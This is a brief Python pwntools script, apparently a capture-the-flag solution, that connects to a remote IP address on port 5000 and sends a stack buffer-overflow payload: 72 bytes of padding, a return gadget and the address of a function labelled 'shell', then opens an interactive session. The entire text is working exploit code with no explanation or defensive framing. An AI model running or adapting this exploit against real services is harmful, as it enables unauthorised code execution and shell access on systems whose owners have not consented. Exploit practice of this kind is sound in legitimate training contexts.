from pwn import*

r=remote("34.134.173.142",5000)
offset=72

shell=p64(0x0000000000401136)
ret=p64(0x000000000040116b)
payload=b'A'*72+ret+shell


r.sendline(payload)
r.interactive()